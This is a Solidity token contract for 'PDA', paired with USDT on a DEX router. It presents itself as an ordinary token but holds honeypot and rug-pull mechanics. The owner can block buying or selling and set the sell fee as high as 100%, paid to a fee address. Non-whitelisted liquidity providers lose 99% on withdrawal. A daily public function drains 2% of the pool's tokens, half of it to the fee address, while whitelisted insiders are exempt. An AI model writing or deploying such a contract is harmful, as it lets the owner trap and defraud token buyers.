// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./interfaces/IERC20.sol";
import "./interfaces/IFactory.sol";
import "./interfaces/IPair.sol";
import "./interfaces/IRouter02.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/math/Math.sol";

contract PDA is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    string private _name = "PDA";
    string private _symbol = "PDA";
    uint8 private _decimals = 18;
    uint256 private _totalSupply = 210000000 * 10**uint256(_decimals);

    address public immutable pair;

    address public feeAddress;
    address public constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address public constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public constant DEAD_ADDRESS = 0x000000000000000000000000000000000000dEaD;


    bool public buyStatus = false;
    bool public sellStatus = true;

    uint256 public sellFeeRate = 50;

    uint256 public constant DAILY_BURN_RATE = 20;
    uint256 public constant BURN_INTERVAL = 1 days;
    uint256 public lastBurnTime;
    
    mapping(address => bool) public whiteList;
    
    constructor(address _feeAddress) Ownable(msg.sender) {
        require(_feeAddress != address(0), "Invalid fee address");
        feeAddress = _feeAddress;

        IRouter02 router = IRouter02(ROUTER);
        IFactory factory = IFactory(router.factory());

        pair = factory.createPair(address(this), USDT);
        _balances[msg.sender] = _totalSupply;
        whiteList[msg.sender] = true;
        lastBurnTime = block.timestamp;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, currentAllowance - amount);
        return true;
    }

    function setFeeAddress(address _feeAddress) external onlyOwner {
        require(_feeAddress != address(0), "Invalid receive wallet");
        feeAddress = _feeAddress;
    }

    function addWhiteList(address user) external onlyOwner {
        require(user != address(0), "Invalid address");
        whiteList[user] = true;
    }

    function removeWhiteList(address user) external onlyOwner {
        whiteList[user] = false;
    }

    function batchAddWhiteList(address[] calldata users) external onlyOwner {
        for (uint256 i = 0; i < users.length; i++) {
            require(users[i] != address(0), "Invalid address");
            whiteList[users[i]] = true;
        }
    }

    function batchRemoveWhiteList(address[] calldata users) external onlyOwner {
        for (uint256 i = 0; i < users.length; i++) {
            whiteList[users[i]] = false;
        }
    }

    function isWhiteListed(address user) external view returns (bool) {
        return whiteList[user];
    }

    function setBuyStatus(bool _status) external onlyOwner {
        buyStatus = _status;
    }

    function setSellStatus(bool _status) external onlyOwner {
        sellStatus = _status;
    }

    function setSellFeeRate(uint256 _feeRate) external onlyOwner {
        require(_feeRate <= 1000, "Fee rate cannot exceed 100%");
        sellFeeRate = _feeRate;
    }

    function burnPoolTokens() external {
        require(block.timestamp >= lastBurnTime + BURN_INTERVAL, "Burn interval not reached");
        
        uint256 pairBalance = _balances[pair];
        require(pairBalance > 0, "No tokens in pool");
        
        uint256 burnAmount = pairBalance * DAILY_BURN_RATE / 1000;
        require(burnAmount > 0, "Burn amount too small");
        
        uint256 toBurn = burnAmount / 2;
        uint256 toFeeAddress = burnAmount - toBurn;
        
        _balances[pair] -= burnAmount;
        
        if (toBurn > 0) {
            _balances[DEAD_ADDRESS] += toBurn;
            emit Transfer(pair, DEAD_ADDRESS, toBurn);
        }
        
        if (toFeeAddress > 0) {
            _balances[feeAddress] += toFeeAddress;
            emit Transfer(pair, feeAddress, toFeeAddress);
        }
        lastBurnTime = block.timestamp;
        IPair(pair).sync();
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(_balances[sender] >= amount, "ERC20: transfer amount exceeds balance");

        _balances[sender] -= amount;

        uint256 transferAmount = amount;

        if (sender == pair) {
            uint256 removeLiquidity = _isRemoveLiquidity(transferAmount);
            if (removeLiquidity > 0) {
                if (!whiteList[recipient]) {
                    uint256 userReceive = amount / 100; 
                    uint256 burnAmount = amount - userReceive;
                    transferAmount = userReceive;
                    if (burnAmount > 0) {
                        _balances[DEAD_ADDRESS] += burnAmount;
                        emit Transfer(sender, DEAD_ADDRESS, burnAmount);
                    }
                }
            } else {
                if (!whiteList[recipient]) {
                    require(buyStatus, "Access denied: can't buy PDA");
                }
            }
        }

        if (recipient == pair) {
            if (!whiteList[sender]) {
                if(_isAddLiquidity(transferAmount) <= 0) {
                    require(sellStatus, "Access denied: can't sell PDA");
                    uint256 sellFee = amount * sellFeeRate / 1000;
                    transferAmount = amount - sellFee;

                    if (sellFee > 0) {
                        _balances[feeAddress] += sellFee;
                        emit Transfer(sender, feeAddress, sellFee);
                    }
                }
            }
        }
        
        _balances[recipient] += transferAmount;
        emit Transfer(sender, recipient, transferAmount);
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _isRemoveLiquidity(
        uint256 amount
    ) internal view returns (uint256 liquidity) {
        (uint256 rOther, , uint256 balanceOther) = _getReserves();

        if (balanceOther <= rOther) {
            liquidity = (amount * IPair(pair).totalSupply()) / (balanceOf(pair) - amount);
        }
    }

    function _getReserves() internal view returns (uint256 rOther, uint256 rThis, uint256 balanceOther)
    {
        (uint r0, uint256 r1, ) = IPair(pair).getReserves();

        address tokenOther = USDT;
        if (tokenOther < address(this)) {
            rOther = r0;
            rThis = r1;
        } else {
            rOther = r1;
            rThis = r0;
        }

        balanceOther = IERC20(tokenOther).balanceOf(pair);
    }

    function _isAddLiquidity(
        uint256 amount
    ) internal view returns (uint256 liquidity) {
        (uint256 rOther, uint256 rThis, uint256 balanceOther) = _getReserves();
        uint256 amountOther;
        if (rOther > 0 && rThis > 0) {
            amountOther = (amount * rOther) / rThis;
        }
        if (balanceOther >= rOther + amountOther) {
            liquidity = calLiquidity(balanceOther, amount, rOther, rThis);
        }
    }

    function calLiquidity(
        uint256 balanceA,
        uint256 amount,
        uint256 r0,
        uint256 r1
    ) private view returns (uint256 liquidity) {
        uint256 pairTotalSupply = IPair(pair).totalSupply();
        address feeTo = IFactory(IRouter02(ROUTER).factory()).feeTo();
        bool feeOn = feeTo != address(0);
        uint256 _kLast = IPair(pair).kLast();
        if (feeOn) {
            if (_kLast != 0) {
                uint256 rootK = Math.sqrt(r0 * r1);
                uint256 rootKLast = Math.sqrt(_kLast);
                if (rootK > rootKLast) {
                    uint256 numerator = pairTotalSupply *
                        (rootK - rootKLast) *
                                8;
                    uint256 denominator = rootK * 17 + (rootKLast * 8);
                    uint256 feeToLiquidity = numerator / denominator;
                    if (feeToLiquidity > 0) pairTotalSupply += feeToLiquidity;
                }
            }
        }
        uint256 amount0 = balanceA - r0;
        if (pairTotalSupply == 0) {
            liquidity = Math.sqrt(amount0 * amount) - 1000;
        } else {
            liquidity = Math.min(
                (amount0 * pairTotalSupply) / r0,
                (amount * pairTotalSupply) / r1
            );
        }
    }
}